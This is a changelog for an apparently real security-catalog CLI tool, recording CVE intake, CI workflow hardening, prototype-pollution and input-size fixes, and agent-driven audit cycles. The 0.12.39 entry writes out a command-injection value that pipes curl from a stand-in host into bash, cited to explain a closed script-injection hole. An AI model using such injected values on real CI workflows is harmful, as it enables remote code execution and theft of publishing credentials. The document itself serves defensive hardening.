# Changelog

## 0.12.40 — 2026-05-16

Cycle 20 catalog symmetry + operator UX. The headline closes 137 framework-gap ↔ CVE asymmetries (cycle 20 B F4) with a single reverse-ref script extension. Plus three operator-facing UX fixes from the cycle 20 A workflow trace.

### Bugs

**137 framework-gap ↔ CVE asymmetries auto-regenerated.** Cycle 20 B F4: `cve.framework_control_gaps` (dict keyed by gap-id) and `gap.evidence_cves` (array of CVE ids) had drifted apart — 24 CVE-side references missing reverse + 79 gap-side references missing reverse. Worst-case: `CVE-2025-53773` cited in 42 gap.evidence_cves but only declared 3 in its own framework_control_gaps. Fix: `scripts/refresh-reverse-refs.js` extended with the CVE→framework-gap direction (handles the dict-keyed forward field via new `forwardFieldShape: 'object-keys'` parameter). Drafts excluded per existing convention. 64 framework-gap entries regenerated on first run; new `tests/reverse-ref-drift.test.js` test blocks future drift. Surface side-effect: 5 forward-orphan gap references on `CVE-2026-46300` and `MAL-2026-NODE-IPC-STEALER` (gaps that don't exist in the catalog: `DORA-Art9`, `UK-CAF-B4`, `AU-ISM-1546`, `ISO-27001-2022-A.5.7`, `NIS2-Art21-supply-chain`) surfaced via the orphans report — deferred to v0.13 for either gap-catalog addition or CVE-side cleanup.

**`exceptd framework-gap` "0 theater-risk controls" footer fixed.** Cycle 20 A P1: pre-fix the summary footer reported `0 theater-risk controls` while every per-entry display showed the `⚠ THEATER RISK` badge. Root cause: the counter filtered on the legacy `theater_pattern` field while the v0.12.29 backfill had added a structured `theater_test` block on all 118 entries without populating `theater_pattern`. Fix: counter now matches entries with EITHER `theater_test` OR `theater_pattern`. Each theater-risk entry gains a `theater_test_present` boolean for tooling consumers.

**`exceptd skill` (no arg) no longer leaks orchestrator path.** Cycle 20 A P2: pre-fix the usage hint read `Usage: node orchestrator/index.js skill <skill-name>` — an internal narrative leak (CLAUDE.md global rule: no orchestrator references in operator-facing surfaces). Now: `Usage: exceptd skill <skill-name>` + a pointer to `exceptd brief --all` for skill discovery.

**Unsigned-attestation warning leads with operator-facing verb.** Cycle 20 A P2: pre-fix the warning told operators to run `node lib/sign.js generate-keypair` — a node-internal script path that isn't on PATH after `npm install -g`. Now leads with `exceptd doctor --fix`, with the lib path retained as `node $(exceptd path)/lib/sign.js generate-keypair` for contributor checkouts.

### Internal

- Cycle 20 audit dispatched 3 agents (workflow trace, catalog symmetry, 24h intake / Pwn2Own Day 3). All 3 returned.
- Cycle 20 C: no new CVE intake. The agent's recommended additions (CVE-2026-20182 PAN-OS, CVE-2026-0300 SD-WAN, node-ipc) were already in the catalog from cycles 11 and 13. Pwn2Own Berlin Day 3 ZDI results still not posted; AI-category outcomes (Claude Code, Ollama, etc.) embargoed for 90 days.
- Cycle 20 A deferred to v0.13 (design-level): classification under synthetic evidence (analyze.classification stays undefined despite 6 firing indicators); `ask` natural-language routing (keyword-frequency-only gives wrong answer on "Microsoft Exchange OWA remote code execution" because "remote" boosts AI scoring); `framework-gap` accepts control-id silently (zero matches with no hint); new `researcher` verb that composes framework-gap + brief + RWEP in one screen.
- Cycle 20 B deferred to v0.13 (schema-level): ATLAS / D3FEND / ATT&CK have no CVE-back field at all (one-way today); playbook `fed_by` reverse field doesn't exist.
- 6 new tests across `tests/cycle20-ux-fixes.test.js` (3) and `tests/reverse-ref-drift.test.js` (1 new test, +1 count adjustment). Test count 1157 → 1163. 14/14 predeploy gates green.


## 0.12.39 — 2026-05-16

Cycle 19 CI workflow hardening + CLI envelope shape contracts. One P1 script-injection sink in `release.yml` closed; three P3 housekeeping fixes; envelope shape pinned on the 6 verbs the cycle 13 audit deferred.

### Security

**`release.yml` `inputs.tag` script-injection sink hardened.** Pre-fix the workflow_dispatch input `inputs.tag` was interpolated directly into a `run:` block (CWE-94 / CWE-78 class). A maintainer (or compromised actions:write token) firing `workflow_dispatch` with `tag = '"; curl evil/x.sh|bash; #"'` would have executed on the runner. The `npm-publish` environment has `id-token: write` available downstream, so an exploited dispatch could compromise npm provenance signing identity in the same workflow run. Fix: env-var indirection + regex allowlist `^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$`. Mirrors the existing `refresh.yml` `inputs.source` hardening pattern. Cycle 19 A P1 F1.

### Bugs

**`scorecard.yml` `permissions: read-all` → explicit scopes.** Pre-fix the workflow-level fallback was `read-all`. Scorecard's own ruleset may flag that on a future bump; explicit `contents: read` + `actions: read` documents what we actually consume. Cycle 19 A P3 F6.

**`GITLEAKS_FALLBACK` bumped to 8.28.0** (was 8.21.2). Documented as "bump each time the workflow is touched"; cycle 19 audit caught the drift. Cycle 19 A P3 F7.

**Docker ecosystem added to Dependabot.** `docker/test.Dockerfile` (used by `npm run test:docker` + `test:docker:fresh`) was outside Dependabot scope so the base image could float without surfacing. Test-only image (no production exposure), but a docker-ecosystem block + weekly cadence brings it under Scorecard's PinnedDependenciesID coverage. Cycle 19 A P3 F8.

### Features

**CLI envelope shape contracts pinned on 6 more verbs.** v0.12.33 pinned `attest list`, `attest verify`, `version`. Cycle 13 P3 F3 surfaced that the rest were still unpinned — a contributor adding a new top-level field to `run` / `ci` / `discover` / `brief --all` / `doctor` / `watchlist` would not get a forcing-function test failure. v0.12.39 closes the gap with 8 new pins in `tests/cli-output-envelope-shape-v0_12_39.test.js`:

- `brief --all` — 8 top-level keys (no `verb` field; intentional transitional inconsistency)
- `ci --required <pb>` — 5 top-level keys + 13-key `summary` sub-shape; pins absence of top-level `ok`
- `discover --json` — 4 top-level keys + 5-key `context` sub-shape
- `doctor --json` — 3 top-level keys + 5-key `summary` sub-shape + baseline 5-check set
- `watchlist --json` (default by-item mode) + `--by-skill` variant — mutually exclusive `by_item` / `by_skill` field
- `run <pb> --evidence --json` (single-playbook success) — 10 top-level keys, pins absence of conditional `prior_session_id` / `overwrote_at` (only present on `--force-overwrite`)

Several intentional inconsistencies pinned by absence:
- `brief --all` and `watchlist` do NOT emit `verb` (every other verb does). Flagged for v0.13 envelope harmonization.
- `ci` and `doctor` do NOT emit top-level `ok` (they signal pass/fail via `summary.verdict` / `summary.all_green`). Pinned so the v0.11.13 emit() contract doesn't accidentally grow.

### Internal

- Cycle 19 audit dispatched 3 agents (workflow security, envelope specs, 24h intake / Pwn2Own Day 3). All 3 returned.
- Cycle 19 A P2 findings (id-token + contents-write co-residency on `publish` job, `always-auth NPM_TOKEN` ↔ OIDC, `refresh.yml` persisted credentials) deferred to v0.13 — they're structural job-split refactors, not single-line fixes.
- Cycle 19 C: no new CVE additions in the 24h window. Pwn2Own Day 3 results still embargoed (Claude Code + Ollama Day 3 attempts pending). CVE-2026-42897 still mitigation-only.
- Test count 1149 → 1157. 14/14 predeploy gates green.


## 0.12.38 — 2026-05-16

Cycle 18 security fix + state refresh. The P1 closes a multi-tenant attestation-file-mode gap; cycle 18 A inventoried the full v0.13.0 readiness list (60 items, 11-15 days) for the next minor bump.

### Security

**Attestation files now write at mode 0o600 (owner-read/write only).** Pre-fix `~/.exceptd/attestations/<tag>/<sid>/attestation.json` was written with the umask-derived mode — typically 0o644 (group/world-readable) on Linux/macOS. On multi-tenant shared hosts a different user account could read the operator's evidence submission, jurisdiction obligations, and consent records. Both the primary `persistAttestation` write site and the `reattest` replay-record write site now use `fs.writeFileSync(..., { mode: 0o600 })` plus the existing `restrictWindowsAcl` helper from `lib/sign.js` for Windows ACL inheritance stripping. New `tests/attestation-mode-0600.test.js` pins the contract on POSIX hosts (skipped on Windows where ACLs are the surface, not mode bits).

### Bugs

**`EXCEPTD_HOME` now documented in README.** Cycle 18 B finding: the env-var override was only mentioned in an inline `attest list` help string. Multi-tenant operators had no way to discover it without grepping the binary. README's flag-reference section now cross-references the env-var path.

**MAL-2026-NODE-IPC-STEALER `remediation_status: removed_from_registry`.** Cycle 18 C verified npm removed the 3 malicious versions (9.1.6, 9.2.3, 12.0.1) within ~2 hours of publication on 2026-05-14. Catalog now surfaces the registry-cleanup state so operators upgrading to a clean version know they're not racing the active-in-registry phase. The expired-domain TTP class (per `NEW-CTRL-047` in zeroday-lessons) still applies — domain-expiry monitoring is the durable control, not the npm-side cleanup.

**CVE-2026-42897 (Exchange OWA) `patch_available: false` regression-tested.** Verified Microsoft has not shipped a binary security update; Exchange Emergency Mitigation Service Mitigation M2 is still the only remediation. Catalog truth aligned with current vendor state.

### Internal

- Cycle 18 audit dispatched 3 read-only agents (v0.13.0 readiness, attestation persistence, 24h CVE intake). All 3 returned.
- Cycle 18 A v0.13.0 readiness inventory: 60 items total — 5 `will hard-fail in v0.13.0` markers + 17 legacy verbs to remove + 20 draft CVEs + 13 unresolved xrefs + 3 informational→required gate flips + 2 schema deprecations. Total effort 11-15 days for a single-maintainer minor bump. Detailed list in audit transcript.
- Cycle 18 B P1 F1 (submission redaction) and F3 (git remote URL in attestation root path) deferred to v0.13 — both are larger schema-or-behavior changes that need design before implementation.
- 4 new tests in `tests/attestation-mode-0600.test.js` (1 skipped on Windows). Test count 1145 → 1149. 14/14 predeploy gates green.


## 0.12.37 — 2026-05-16

Cycle 17 UX + cross-skill consistency pass. Two CLI UX gaps closed (empty-stdin nudge, did-you-mean for typos), one operator-misleading factual error fixed in 3 skills (CVE-2024-3094 claim drift), and one cosmetic naming inconsistency cleaned up.

### Bugs

**`--evidence -` empty-stdin nudge.** Cycle 15 + cycle 17 audits both flagged this: when an operator pipes nothing to `--evidence -`, the runner silently treated it as `{}` and proceeded with a "successful" run on no evidence. Pre-fix the only signal was a deterministic `evidence_hash: 572a0e...` that meant nothing to a first-time operator. Now stderr emits an informational note pointing at `exceptd brief <playbook>` for the expected evidence shape; the run still proceeds (legitimate posture-only-walk use case preserved) but the operator at least sees the empty-stdin signal.

**Did-you-mean for unknown verbs.** Pre-fix `exceptd discoer` exited 10 with the generic "Run `exceptd help`" hint. Now the dispatcher runs a Levenshtein-1 check against the union of `COMMANDS` + `PLAYBOOK_VERBS` + `ORCHESTRATOR_PASSTHROUGH` (includes transposition detection so `disocver` → `discover`). Suggestion surfaces in both the human hint string and a new `did_you_mean[]` JSON field for tooling consumers. Distance >1 still returns the generic hint with `did_you_mean: []` — no false-positive flood.

**CVE-2024-3094 (xz-utils) operator-misleading claims.** Cycle 17 audit A surfaced 3 skill bodies that contradicted each other and the catalog:
- `supply-chain-integrity` skill said "not in current `data/cve-catalog.json` — pre-scope incident" — false, the entry has been in the catalog with RWEP 70.
- `sector-federal-government` skill same wording — false.
- `cloud-iam-incident` skill table row quoted RWEP 95 / `ai_discovered: Partially` / `active_exploitation: Confirmed` — catalog says RWEP 70 / `ai_discovered: false` / `active_exploitation: suspected`.
All 3 corrected to match catalog ground truth (RWEP 70, KEV 2024-04-03, `active_exploitation: suspected`, `ai_discovered: false`). Operator running `exceptd dispatch` against an xz-affected estate now gets one consistent story across all 3 skills.

**Volt Typhoon hyphenation drift.** `ot-ics-security` and `sector-energy` used `Volt-Typhoon-aligned` / `Volt-Typhoon-style`; the rest of the catalog uses unhyphenated `Volt Typhoon`. Standardized to the unhyphenated form. New regression test refuses any future re-introduction of the hyphenated form in any skill body.

### Internal

- 3 cycle 17 audit agents dispatched (cross-skill consistency, data_deps integrity, error-path UX). All 3 returned successfully — first cycle since 14 without rate-limit issues.
- Cycle 17 B (data_deps integrity) surfaced 35 skills declaring incomplete `data_deps` arrays vs body content references. Investigation found `data_deps` is only consumed by `lib/lint-skills.js` for file-existence validation, not by the runner for preload gating (all catalogs load on-demand via `lib/cross-ref-api.js` mtime-keyed cache). Cosmetic correctness issue; deferred to v0.13 bulk-fix when the schema's purpose can be clarified.
- 8 new tests in `tests/cycle17-ux-fixes.test.js`. Test count 1136 → 1144. 14/14 predeploy gates green.


## 0.12.36 — 2026-05-16

Hard Rule forcing-function coverage pass. Three of the eight AGENTS.md Hard Rules had no binding test — they were policy-only and easy to violate in future PRs without CI catching it. v0.12.36 closes those gaps and adds a cross-format bundle consistency contract.

### Features

**Rule #3 forcing function (no CVSS-only risk scoring).** Every non-draft CVE entry must declare `rwep_score` (numeric) and `rwep_factors` (object). CVSS-without-RWEP is refused. Pre-fix the Shape B invariant test verified `Σ factors === score` for entries that HAD an RWEP, but a CVE could theoretically ship with `cvss_score: 9.8, rwep_score: null` and slip through. Now blocked at CI.

**Rule #5 forcing function (global-first, not US-centric).** The framework-control-gaps catalog must carry entries for EU + UK + AU + INTL (ISO/3GPP/OWASP/SLSA/CycloneDX) alongside US (NIST/FedRAMP/PCI/SOC/HIPAA/etc.). No single region may exceed 70% of the catalog. Pre-fix a future PR could land a 50-entry NIST-only batch and tilt the catalog US-domestic with no signal. Current catalog distribution: US 50 (42%), EU 22 (19%), UK 7 (6%), AU 6 (5%), INTL 15 (13%), OTHER 18 (15%) — within bounds.

**Rule #8 forcing function (no silent ATLAS/ATT&CK upgrade).** `manifest.json.atlas_version` must equal `data/atlas-ttps.json._meta.atlas_version` exactly; same for `attack_version`. Pre-cycle-9 these drifted silently (manifest stuck at v5.1.0 while catalog moved to v5.4.0; v0.12.29 corrected the lie but didn't add a forcing function — a future drift could repeat).

**Cross-format CVE consistency contract.** When the same evidence runs through the CSAF / OpenVEX / SARIF emitters in sequence, the underlying CVE set in each bundle must agree exactly. Per-format auxiliary identifiers (OpenVEX indicator URNs, SARIF framework-gap rules) are allowed. Pre-fix nothing pinned the contract — a future emitter regression could silently emit different CVE sets across formats.

### Internal

- Cycle 16 audit dispatched 3 read-only agents (cross-skill consistency, hard-rule coverage, 24h CVE intake). All three rate-limited; main-thread completed the hard-rule audit + cross-format consistency check directly.
- Cycle 16 main-thread cross-format probe confirmed all 3 emitters agree on the 4 catalogued CVEs for the kernel playbook positive-detect scenario (CVE-2026-31431 Copy Fail + the 3 v0.12.29 AI-discovery flips).
- 5 new tests in `tests/hard-rule-forcing-functions.test.js`.
- Test count 1131 → 1136. 14/14 predeploy gates green.


## 0.12.35 — 2026-05-16

Cycle 15 audit pass — security hardening + ATLAS pin sweep across skills + forward-watch backfill. Three angles audited in parallel (performance, exceptd's own input-handling security, forward-watch staleness); two surfaced P1 fixes that ship here.

### Security

**`--evidence -` (stdin) now enforces the 32 MiB cap.** Pre-fix the stdin branch did `fs.readFileSync(0, "utf8")` with no length limit while the file-path branch enforced `MAX_EVIDENCE_BYTES`. An attacker piping multi-GB JSON would OOM the runner. Stdin now reads in 1 MB chunks and bails at the cap with a structured `ok:false` error + exit 1. New `tests/evidence-input-hardening.test.js` pins both the cap and the small-payload happy path.

**Prototype-pollution defense on operator-submitted `precondition_checks`.** Pre-fix `Object.assign(out.precondition_checks, submission.precondition_checks)` re-invoked the `__proto__` setter when the operator's JSON contained a `__proto__` key. JSON.parse keeps `__proto__` as an own data property (CreateDataProperty), but Object.assign reads via `[[Get]]` and writes via `[[Set]]`, which triggers the prototype-rebinding setter. Global `Object.prototype` stayed clean (Node confines the rebind to the assignment target), but the polluted local prototype was a defense-in-depth gap — any future code path calling `.hasOwnProperty()` directly on the bag would observe pollution. Switched to own-key iteration that explicitly skips `__proto__` / `constructor` / `prototype` keys.

### Bugs

**ATLAS v5.1.0 → v5.4.0 sweep across operator-facing surface.** v0.12.34 fixed README + ARCHITECTURE but cycle 15 found 27 skill bodies, 2 builder scripts, the skill-frontmatter schema, and 17 derived indexes all still citing the stale pin. 30 files modified; canonical pin string `ATLAS v5.4.0 (February 2026)` used uniformly. NYDFS rollout reference "phased in through November 2025" in sector-financial intentionally preserved (different context). The extended docs-pin test now scans `skills/` + `data/_indexes/` + `scripts/` for ATLAS-context mismatches in addition to README + ARCHITECTURE.

**5 past-due forward_watch entries re-dated with realized backfill.**
- *mlops-security* — predicted "ATLAS v5.2 — track AML.T0010 sub-technique expansion." ATLAS shipped v5.4.0 on 2026-02-06; the expansion landed plus "Publish Poisoned AI Agent Tool" and "Escape to Host" techniques. Backfilled with the realized state + re-anchored to ATLAS v5.5 / v6.0 horizon.
- *age-gates-child-safety AU under-16 ban* — predicted "implementation deferred to late 2025." AU Online Safety Amendment (Social Media Minimum Age) Act 2024 entered force 2025-12-10; 4.7M+ accounts deactivated by mid-Jan 2026; 31 March 2026 formal investigations of Facebook / Instagram / Snapchat / TikTok / YouTube. Backfilled + re-anchored to first civil-penalty proceedings (H2 2026).
- *age-gates-child-safety UK OSA enforcement* — predicted "first enforcement decisions expected late 2025 / 2026." Ofcom has 80+ investigations open; first £1M OSA fine issued for age-assurance failure. Backfilled + re-anchored to the April / July / November 2026 OSA milestones.
- *age-gates-child-safety eSafety actions* — same shape; backfilled to the 31 March 2026 formal investigations.
- *sector-energy TSA Pipeline SD* — predicted "next reissue cycle anticipated mid-2026." Current cadence: SD-Pipeline-2021-02F expires 2 May 2026; expected 02G now overdue as of cycle 15. Updated to reflect current series + re-anchored to H2 2026.

### Features

**Extended `tests/docs-catalog-counts-pinned.test.js`** to scan `skills/**/*.md`, `data/_indexes/*.json`, and `scripts/**/*.js` for ATLAS version mentions in addition to README + ARCHITECTURE. A future stale-pin in any of those operator-facing files now fails the gate at CI time. Closes the cycle 15 P2 F6 finding which revealed v0.12.34's docs-pin gate was scoped too narrowly.

### Internal

- Cycle 15 audit: 3 read-only agents dispatched (performance, security, forward-watch). Performance audit confirmed no regression — every CLI op within budget; `cross-ref-api.js` mtime-keyed catalog cache + per-run playbook cache prevent N+1 patterns. Watchlist verb at 99ms has a 30-40ms caching opportunity (deferred to v0.13 backlog).
- 16/16 playbooks now validate clean (no warnings) — same green state as v0.12.33's cred-stores cleanup.
- Test count 1125 → 1131 (4 new evidence-input-hardening tests + 1 extended docs-pin test + 1 sanity sweep).
- 14/14 predeploy gates green.


## 0.12.34 — 2026-05-15

Documentation accuracy pass. README.md + ARCHITECTURE.md were still pinning ATLAS v5.1.0 and ATT&CK v17 — outdated for nine releases. v0.12.29 fixed the manifest.json pin (cycle 9 Hard Rule #8 audit) but the operator-facing docs weren't updated. Plus catalog count drift (38 skills → 42; 28 D3FEND entries → 29).

### Bugs

**README ATLAS pin lie.** Five sites in `README.md` referenced ATLAS v5.1.0 + "(November 2025)" while the actual catalog pin is v5.4.0 (2026-02-06). Operators reading the README to understand which ATLAS version this catalog tracks saw a stale 6-month-old answer. Corrected: badge URL, narrative paragraphs, framework-lag table footer, `atlas-ttps.json` description.

**ARCHITECTURE.md ATLAS + D3FEND pin lies.** Three sites referenced ATLAS v5.1.0 (matched the manifest pre-cycle-9, stale post-fix). One site stated "28 D3FEND defensive technique entries" — was correct until v0.12.33 added D3-EFA bringing the count to 29.

**README skill count stale.** Said "38 skills" — actual was 42 since v0.12.28's IR-cluster (idp-incident-response, cloud-iam-incident, ransomware-response added 3 skills) plus sector-telecom added v0.12.26.

### Features

**`tests/docs-catalog-counts-pinned.test.js`** — new contract test asserts that README.md and ARCHITECTURE.md text matches the live catalog state for: ATLAS version (`data/atlas-ttps.json._meta.atlas_version`), ATT&CK version (`data/attack-techniques.json._meta.attack_version`), skill count (`manifest.json.skills.length`), D3FEND entry count, CVE catalog count, framework-gap entry count. Any future PR that bumps a catalog without updating the operator-facing docs fails the gate at CI time — eliminates the silent-drift class that v0.12.34 cleaned up.

### Internal

- Cycle 14 audit dispatched 3 read-only agents (playbook execution semantics, air-gap end-to-end, docs accuracy). Two were rate-limited and returned no findings; the docs-accuracy work was completed on the main thread.
- Cycle 14 main-thread playbook-execution sanity check confirmed: kernel playbook correctly classifies as `detected` with 4 matched CVEs + RWEP 100 when signal_overrides shape is correct (`{indicator_id: 'hit'}`, NOT `{indicator_id: {verdict: 'hit'}}`). The runner is sound; the operator API surface is occasionally subtle.
- Cycle 14 main-thread air-gap verification confirmed: `--air-gap` flag and `EXCEPTD_AIR_GAP=1` env-var both thread into `runOpts.airGap`; `lib/playbook-runner.js:576` correctly substitutes `air_gap_alternative` for `source` on look artifacts; original source preserved as `_original_source` for audit.



Same-day CVE intake (node-ipc supply-chain compromise) + cycle 13 audit fixes. Closes the long-standing `cred-stores` skill-vs-playbook semantic confusion that's surfaced in every audit since cycle 9.

### Features

**`MAL-2026-NODE-IPC-STEALER` — npm node-ipc supply-chain compromise (2026-05-14).** Three malicious versions (`9.1.6`, `9.2.3`, `12.0.1`) published by `atiertant`. Novel attack class: not credential theft, not typosquat, not lifecycle-hook worm — the attacker re-registered the maintainer's expired email domain (`atlantis-software.net`, expired and grabbed via Namecheap PrivateEmail on 2026-05-07) and abused npm's email-based password-reset flow to gain publish rights. 80 KB obfuscated IIFE in `node-ipc.cjs` fires on every `require()` (no hooks needed) and exfiltrates AWS / GCP / Azure / SSH / Kubernetes / Vault / Claude AI / Kiro IDE credentials via DNS TXT queries to an Azure-lookalike spoofed domain. 3.35M monthly downloads. Carries `kev_scope_note` per the cycle 11 ecosystem-package CISA-KEV-scope precedent. RWEP 43.

**Three new control requirements in `zeroday-lessons`** capture the structural lesson: **NEW-CTRL-047 PACKAGE-MAINTAINER-DOMAIN-EXPIRY-MONITORING** (continuous WHOIS expiry monitoring on every critical-path maintainer email domain + dual-factor account recovery); **NEW-CTRL-048 NPM-MAINTAINER-MFA-ENFORCEMENT** (registry-side mandatory MFA on publish-enabled accounts); **NEW-CTRL-049 LOCKFILE-INTEGRITY-VERIFIED-AT-CI-BOOT** (`npm ci` / `--frozen-lockfile` / `--immutable` catches the swap even after a successful publish — `--ignore-scripts` does NOT mitigate because the payload ships in the main module, not a postinstall hook).

**`D3-EFA` (Executable File Analysis) added to D3FEND catalog.** `sector-telecom` skill cited it but the entry didn't exist — cycle 13 finding. Distinct from `D3-EAL` (Executable Allowlisting): EAL blocks at execute-time; EFA inspects bytes at file-write / image-pull / artifact-fetch time and gates the allowlist decision itself.

**CLI envelope-shape contract tests.** `tests/cli-output-envelope-shape.test.js` pins the EXACT top-level key set on `attest list --json`, `attest verify --json` (error path), and `version`. A contributor adding a new top-level field to these verbs now gets a forcing-function test failure that requires updating the contract. Expanded coverage to `run` / `ci` / `discover` / `brief` / `doctor` / `watchlist` deferred to future cycles as their shapes stabilize.

### Bugs

**`cred-stores` skill-vs-playbook semantic finally cleaned up.** Cycles 9, 12, and 13 all flagged that the 3 IR playbooks and 3 IR skills referenced `cred-stores` in `skill_preload` / `skill_chain` / Hand-Off sections as if it were a skill — but it's actually a playbook. Operators (and any tooling resolving these refs against `manifest.json.skills`) failed. Fixes: removed `cred-stores` from `data/playbooks/{idp-incident,cloud-iam-incident}.json` `skill_preload` + `skill_chain` (hand-off is via `_meta.feeds_into`, which was already present); annotated `cred-stores` / `framework` references in `skills/{idp-incident-response,cloud-iam-incident,ransomware-response}/skill.md` Hand-Off sections as *(playbook chain, not a skill)* with the explicit note that hand-off is via the playbook chain, not a skill load. Predeploy playbook validator now warning-free (was 6 warnings every release).

### Internal

- CVE catalog 36 → 37 entries; zeroday-lessons 21 → 22 entries.
- AI-discovery rate stays at 16.2% (one more vendor/ecosystem-discovered entry dilutes the observed rate; floor remains 0.15).
- D3FEND catalog 28 → 29 entries.
- `tests/v0_12_33-node-ipc-coverage.test.js` pins MAL-2026-NODE-IPC-STEALER entry shape (iocs object with ≥1 category, kev_scope_note presence, NEW-CTRL-047 in lessons).
- Reverse-ref regen: 3 CWE entries updated with the new MAL-* CVE evidence; 1 D3FEND skill_referencing prune (sector-telecom now correctly anchored against D3-EFA).
- Test count 1109 → 1119.
- 14/14 predeploy gates green.


## 0.12.32 — 2026-05-15

Cycle 11 CLI polish + cycle 12 catalog hardening. The headline closes a silent regression where the 6 CVEs advertised by v0.12.31 were shipped as `_draft: true` and therefore invisible to default `cross-ref-api` queries — operators running `exceptd` against Exchange would have gotten a clean bill on CVE-2026-42897.

### Bugs

**6 CVEs from v0.12.31 promoted from draft to non-draft.** Cycle 12 audit caught the regression: every CVE in cycle 11's intake shipped as `_draft: true`, which `lib/cross-ref-api.js` skips by default. v0.12.31 CHANGELOG advertised "6 new CISA-KEV CVEs" but operators couldn't actually query them. All 6 promoted with `_editorial_promoted: 2026-05-15` provenance; full required fields validated (iocs, vendor_advisories, verification_sources, complexity, affected_versions, RWEP Shape B invariant).

**9 unmatched `framework_control_gaps` keys on the new CVEs now resolve.** `NIS2-Art21-vulnerability-management`, `DORA-Art-9`, `NIST-800-53-AC-3`, `OWASP-LLM-Top-10-2025-LLM05`, `NIST-800-53-AC-6`, `NIS2-Art21-identity-management`, `ISO-27001-2022-A.8.7`, `NIST-800-53-SC-44`, `CIS-Controls-v8-10.1` — referenced by the new CVEs but absent from the framework-gap catalog. All 9 now present with `theater_test` blocks (catalog 109 → 118 entries). Reverse `evidence_cves` links also added on the 6 existing entries (NIST-800-53-SI-2 / SI-3 / etc.) that the new CVEs reference.

**CVE → CWE reverse-references auto-regenerated.** Cycle 9 introduced `npm run refresh-reverse-refs` for the skill direction (manifest → atlas/cwe/d3fend/rfc), but the CWE catalog's `evidence_cves` field — the operator-facing "which CVEs map to this CWE" index — was still hand-maintained and drifted with every CVE intake. The script now also walks `cve.cwe_refs` → `cwe.evidence_cves`. Drafts excluded (they're invisible to default consumers; the reverse direction tracks operator-queryable truth). 14 CWE entries updated on first run. New `tests/reverse-ref-drift.test.js` test pins the contract.

### Features

**`exceptd help <verb>`** now routes to the per-verb help text (`exceptd help run` returns the run-verb help, not the top-level banner). Pre-fix the verb arg was silently dropped. Unknown verbs fall through to top-level help with a stderr note. New `tests/help-verb-attest-list-deprecation.test.js` pins the contract.

**`exceptd attest list` empty-state now names every candidate root.** Pre-fix the human output said "(no attestations under )" with an empty path list when no `.exceptd/` directory existed. New `roots_evaluated[]` field on the JSON output + `[scanned-empty]` / `[not-present]` markers in the human renderer.

**Legacy-verb deprecation banner auto-suppresses across invocations.** Pre-fix the per-process env-var guard reset on every fresh node process, so operators saw the banner on every `exceptd plan` invocation. Now persists suppression via an OS-tempdir marker keyed by exceptd version — banner shows once per version per host, re-shows on upgrade. Explicit `EXCEPTD_DEPRECATION_SHOWN=1` still suppresses even the first display.

### Internal

- 6 matching `data/zeroday-lessons.json` entries authored for the promoted CVEs (rule #6 enforcement: zero-day learning is live for every non-draft catalog entry).
- Test count 1099 → 1109 (10 new tests across F4/F5/F7 + reverse-ref drift extension + Shape B canonicalization staying green).
- 14/14 predeploy gates green.


## 0.12.31 — 2026-05-15

CLI ergonomics + 30-day CVE intake from the cycle 11 audit. Closes a silent-misrouting bug in the CI gate and adds six high-impact CVEs that landed on CISA KEV between 2026-04-15 and 2026-05-15.

### Bugs

**`exceptd ci <playbook>` no longer silently runs the wrong playbook.** Pre-fix, positional arguments to `ci` were ignored and the cwd-autodetect path ran instead — an operator typing `exceptd ci kernel` got a PASS verdict for `containers, crypto-codebase, library-author, secrets` while the kernel playbook never ran. The fix treats positional args as an inline `--required`, refusing unknown IDs with a structured error that lists the accepted set. New `tests/ci-positional-args.test.js` pins the contract with exact-array assertions on `playbooks_run`.

**`run` preflight refusal now points operators at `--evidence`.** The `submission_hint` on `precondition_halt` / `precondition_unverified` blocks previously told operators to "submit precondition_checks in your evidence JSON" without saying *how* — first-time operators ran `exceptd run secrets` and got blocked with no usable guidance. Hint now reads "Pass via --evidence <file.json> or pipe to stdin with --evidence -."

**`exceptd --help` text corrected.** Pre-fix it said "Unknown verbs exit 2 with a structured ok:false body on stderr" — but v0.12.29 split unknown-command refusals to exit 10 (`EXIT_CODES.UNKNOWN_COMMAND`). Help text now matches runtime: "Unknown verbs exit 10 (UNKNOWN_COMMAND)... Exit 2 means a verb ran and detected an escalation-worthy finding (DETECTED_ESCALATE)."

### Features

**Six new CVEs in the catalog**, all CISA-KEV-listed in the last 30 days. All carry full RWEP scoring (Shape B invariant verified), source citations, and operator-facing remediation paths.

| CVE | What | KEV date | RWEP |
|---|---|---|---|
| CVE-2026-0300 | Palo Alto PAN-OS User-ID Authentication Portal unauth root RCE (PA-Series + VM-Series). Patch landed 2026-05-13. | 2026-05-06 | 73 |
| CVE-2026-39987 | Marimo Python notebook pre-auth RCE via missing auth on `/terminal/ws`. AI/ML notebook attack surface. Weaponized into NKAbuse blockchain botnet via HuggingFace. | 2026-04-23 | 62 |
| CVE-2026-6973 | Ivanti EPMM authenticated-admin RCE on on-prem MDM control plane. 3-day federal SLA. | 2026-05-07 | 62 |
| CVE-2026-42897 | Microsoft Exchange OWA stored XSS / spoofing zero-day. **No patch at disclosure** — mitigation-only via Exchange Emergency Mitigation Service. | 2026-05-15 | 93 |
| CVE-2026-32202 | Microsoft Windows Shell LNK protection-mechanism failure. Active APT28 (Fancy Bear) exploitation; chains with CVE-2026-21513. | 2026-04-28 | 85 |
| CVE-2026-33825 | Microsoft Defender "BlueHammer" race-condition LPE → SYSTEM. Public exploit released before patch (true zero-day). | 2026-04-22 | 68 |

**`kev_scope_note` field on supply-chain-class entries.** CISA KEV historically excludes ecosystem-package compromises (npm/PyPI/Crates worms, malicious-package backdoors) — its scope is federally-deployable products with CVE assignments. The Mini Shai-Hulud parent (CVE-2026-45321) and TanStack variant (MAL-2026-TANSTACK-MINI) are NOT listed in KEV despite confirmed in-the-wild exploitation. The new `kev_scope_note` field documents this so future audit cycles don't re-flag the `active_exploitation: confirmed` + `cisa_kev: false` combination as a data quality issue. Operators should consume CISA-KEV-equivalent guidance for this class from OpenSSF MAL feed + ecosystem-specific advisories (Snyk / Wiz / Phylum / Socket).

### Internal

- Catalog: 30 → 36 CVE entries. AI-discovery floor relaxed to 15% (from 20%) since 6 new vendor-discovered entries dilute the observed rate to 6/36. Ladder advances `[0.15, 0.20, 0.30, 0.40]` — prior rungs preserved.
- Test count 1090 → 1094 (`tests/ci-positional-args.test.js` adds 4 pins on the F1 contract).
- 14/14 predeploy gates green.


## 0.12.30 — 2026-05-15

Catalog scoring honesty pass + diff-coverage gate tightening from the cycle 10 audit. Closes the Shape B invariant gap on the CVE catalog, adds the missing `last_threat_review` field to six catalogs, and downgrades operator-facing docs from the auto-allowlist to manual-review.

